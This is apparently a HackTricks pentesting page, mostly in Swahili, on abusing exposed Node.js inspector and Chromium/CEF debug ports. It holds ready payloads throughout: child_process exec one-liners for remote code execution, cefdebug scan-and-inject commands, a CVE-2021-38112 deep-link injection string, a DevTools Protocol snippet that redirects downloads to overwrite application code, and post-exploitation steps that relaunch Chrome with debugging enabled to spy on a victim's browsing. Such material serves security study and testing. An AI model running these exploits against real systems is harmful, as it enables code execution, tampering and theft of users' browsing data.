# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Mifano ya kihistoria ya vitendo inajumuisha mwongozo wa Multimaster na shambulio la debugger la Visual Studio Code la CVE-2019-1414; itumie kama muktadha unaotegemea version badala ya kudhani kwamba kila target ya sasa ya Electron au Chromium inafichua primitives zilezile.<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[Katika nyaraka](https://nodejs.org/learn/getting-started/debugging): Inapoanzishwa kwa switch ya `--inspect`, process ya Node.js husikiliza client ya debugging. Kwa **default**, itasikiliza kwenye host na port **`127.0.0.1:9229`**. Kila process pia hupewa **UUID** **ya kipekee**.<sup>[[4]](#references)</sup>

Inspector clients lazima zijue na zibainishe anwani ya host, port, na UUID ili kuunganishwa. URL kamili itaonekana kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Kwa kuwa **debugger ina access kamili kwa mazingira ya utekelezaji ya Node.js**, actor mwenye nia hasidi anayeweza kuunganishwa kwenye port hii anaweza kuweza kutekeleza code kiholela kwa niaba ya process ya Node.js (**uwezekano wa privilege escalation**).<sup>[[4]](#references)</sup>

Kuna njia kadhaa za kuanzisha inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Unapoanzisha process inayokaguliwa, kitu kama hiki kitaonekana:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Michakato inayotegemea **CEF** (**Chromium Embedded Framework**) inaweza kufichua debugger kupitia `--remote-debugging-port=9222`. Hii hufichua browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) badala ya Node.js inspector, hivyo payloads zinazotegemea `process` ya Node.js hazitumiki moja kwa moja kwa default.<sup>[[2]](#references)[[5]](#references)</sup>

Unapoanzisha browser iliyowekwa debug, kitu kama hiki kitaonekana:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguliwa kwenye web-browser zinaweza kutuma maombi ya WebSocket na HTTP chini ya security model ya browser. **Muunganisho wa awali wa HTTP** ni muhimu ili **kupata debugger session id ya kipekee**. **same-origin-policy** **huzuia** tovuti kuweza kuanzisha **muunganisho huu wa HTTP**. Kwa usalama wa ziada dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kuwa **'Host' headers** za muunganisho zinaonyesha ama **IP address** au **`localhost`** kwa usahihi.<sup>[[4]](#references)</sup>

> [!TIP]
> **Hatua hizi za usalama huzuia kutumia inspector vibaya** ili kuendesha code kwa **kutuma tu HTTP request** (jambo ambalo lingewezekana kwa kutumia SSRF vuln).<sup>[[4]](#references)</sup>

### Kuanzisha inspector katika processes zinazoendelea

Unaweza kutuma **signal SIGUSR1** kwa nodejs process inayoendelea ili kuifanya **ianzishe inspector** kwenye default port. Hata hivyo, kumbuka kuwa unahitaji kuwa na privileges za kutosha; kwa hiyo, hii inaweza kukupa **privileged access kwa taarifa zilizo ndani ya process** lakini si privilege escalation ya moja kwa moja.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Hii ni muhimu katika containers kwa sababu **kuzima process na kuanzisha mpya** kwa kutumia `--inspect` **si chaguo** kwa sababu **container** ita**uawa** pamoja na process.<sup>[[6]](#references)</sup>

### Unganisha kwenye inspector/debugger

Ili kuunganisha kwenye **browser inayotumia Chromium**, URL za `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, inapaswa kuhakikisha kuwa **target host na port** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Baada ya URL ya kufikia debugger kuonekana. mfano ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Unganisha kwenye inspector/debugger: Ili kuunganisha kwenye browser inayotumia Chromium,...](<../../images/image (674).png>)

Kwa kutumia **command line** unaweza kuunganisha kwenye debugger/inspector kwa:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), inaruhusu **kutafuta inspectors** zinazoendesha locally na **inject code** ndani yake.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ikiwa umeunganishwa na browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE katika NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron, tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganisha** kwenye Node **inspector** ni kutumia kitu kama hiki (inaonekana kwamba **hii haitafanya kazi kwenye muunganisho wa Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimeona watu wakitumia ku-exploit protocol hii.

### Parameter Injection via Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security iligundua kuwa application iliyotegemea CEF **ilisajili URI maalum** kwenye mfumo (workspaces://index.html) iliyopokea URI kamili, kisha **ilizindua application inayotegemea CEF** ikiwa na configuration iliyoundwa kwa sehemu kutoka kwenye URI hiyo.<sup>[[8]](#references)</sup>

Iligunduliwa kuwa parameters za URI zilikuwa zina-decodiwa kwa URL na kutumiwa kuzindua application ya msingi ya CEF, hivyo kumruhusu mtumiaji **ku-inject** flag **`--gpu-launcher`** kwenye **command line** na kutekeleza vitu vya kiholela.<sup>[[8]](#references)</sup>

Kwa hivyo, payload kama hii:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.<sup>[[8]](#references)</sup>

### Kubatilisha Faili

Badilisha folda ambapo **faili zilizopakuliwa zitahifadhiwa** na upakue faili ili **kubatilisha** mara kwa mara **source code** inayotumiwa ya application kwa **code hasidi** yako.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE na exfiltration

STAR Labs ilionyesha kuwa services za WebDriver/CDP zilizo wazi zinaweza kuwezesha kusoma files kiholela na RCE; DNS rebinding inaweza kukamilisha exploit chain katika baadhi ya configurations.<sup>[[9]](#references)</sup>

Kwa additional historical browser-automation na Chromium security cases, tazama Counter WebDriver write-up na Project Zero issues 773, 1742, na 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

Katika environment halisi na **baada ya ku-compromise** PC ya user inayotumia browser inayotegemea Chrome/Chromium, unaweza ku-launch process ya Chrome ikiwa na **debugging ikiwa ime-activate na ku-forward port ya debugging** ili uweze kuifikia. Kwa njia hii utaweza **kukagua kila kitu mwathiriwa anachofanya kwa Chrome na kuiba taarifa nyeti**.<sup>[[7]](#references)</sup>

Njia ya kujificha ni **ku-terminate kila process ya Chrome** kisha kuita kitu kama:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Zana ya ukaguzi na exploitation ya CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Utekelezaji wa Msimbo kwa Mbali wa Visual Studio Code kupitia Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Mwongozo wa Debugging wa Node.js - Kuanza](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup ya corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Kutumia Vibaya Kipengele cha Debugging cha Chrome Kuchunguza na Kudhibiti Vipindi vya Kuvinjari kwa Mbali](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Utekelezaji wa Msimbo kwa Mbali wa AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Unazungumza Nami? - WebDriver RCE kupitia DNS Rebinding na CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Kutoka Bot hadi RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
